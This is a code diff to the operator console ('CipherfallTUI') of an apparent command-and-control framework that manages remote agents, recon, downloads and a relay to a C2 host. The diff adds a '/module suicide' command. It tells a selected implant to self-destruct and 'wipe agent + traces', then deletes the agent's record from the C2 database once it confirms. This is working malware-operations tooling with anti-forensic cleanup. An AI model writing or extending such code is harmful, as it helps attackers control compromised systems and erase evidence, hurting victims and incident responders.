@@ -465,6 +465,7 @@ class CipherfallTUI(App):
     _download_tasks:    dict[str, dict] = {}  # task_id -> {type, ...}
     _download_sessions: dict[str, dict] = {}  # session_id -> state
     _recon_tasks:       dict[str, dict] = {}  # task_id -> {type, agent_id, remote_path}
+    _suicide_tasks:     dict[str, str]  = {}  # task_id -> agent_id
 
     # ── Layout ───────────────────────────────────────────────────────────────
 
@@ -688,6 +689,30 @@ class CipherfallTUI(App):
                 log.write(f"[green]{_escape(out.strip())}[/green]")
             else:
                 log.write("[dim]running recon…[/dim]")
+            return
+
+        si = self._suicide_tasks.get(task_id)
+        if si is not None:
+            out = task.get("output") or ""
+            if out:
+                log.write(f"[red]{_escape(out.strip())}[/red]")
+                if "[suicide: ok]" in out:
+                    log.write("[yellow]agent dead — removing from DB…[/yellow]")
+                    try:
+                        base_url = self._agent_base.get(si, BASE)
+                        async with httpx.AsyncClient() as c:
+                            await c.delete(f"{base_url}/admin/agents/{si}", timeout=3)
+                        if self._selected_agent == si:
+                            self._selected_agent = None
+                            self._selected_task  = None
+                            self.query_one("#cmd-input", Input).placeholder = "select an agent first"
+                        self.query_one("#tasks-table", DataTable).clear()
+                        self.query_one("#agents-table", DataTable).clear()
+                        await self._load_agents()
+                    except Exception as e:
+                        log.write(f"[red]DB cleanup error: {e}[/red]")
+            else:
+                log.write("[dim]waiting for suicide confirmation…[/dim]")
             return
 
         dl = self._download_tasks.get(task_id)
@@ -976,6 +1001,36 @@ class CipherfallTUI(App):
                     cmd = f"/module relay start 123 {_C2_HOST}:443"
                 elif len(parts) == 4 and parts[2] == "start":
                     cmd = f"/module relay start {parts[3]} {_C2_HOST}:443"
+        elif cmd == "/module suicide":
+            agent_id = self._selected_agent
+            if not agent_id:
+                return
+            a_data = self._agents_data.get(agent_id, {})
+            label  = a_data.get("label") or agent_id[:8]
+
+            async def on_suicide_confirm(confirmed: bool) -> None:
+                if not confirmed:
+                    return
+                base_url = self._agent_base.get(agent_id, BASE)
+                try:
+                    async with httpx.AsyncClient() as c:
+                        r = await c.post(
+                            f"{base_url}/admin/task",
+                            json={"agent_id": agent_id, "command": "/module suicide"},
+                            timeout=3,
+                        )
+                        result = r.json()
+                    self._suicide_tasks[result["task_id"]] = agent_id
+                    self._selected_task = result["task_id"]
+                    self.query_one("#output-log", RichLog).write(
+                        "[yellow]suicide dispatched — agent will self-destruct…[/yellow]"
+                    )
+                    await self._load_tasks(agent_id)
+                except Exception as e:
+                    self.query_one("#output-log", RichLog).write(f"[red]error: {e}[/red]")
+
+            self.push_screen(ConfirmModal(f"Suicide  {label}?  [wipe agent + traces]"), on_suicide_confirm)
+            return
         base = self._agent_base.get(self._selected_agent or "", BASE)
         try:
             async with httpx.AsyncClient() as c:
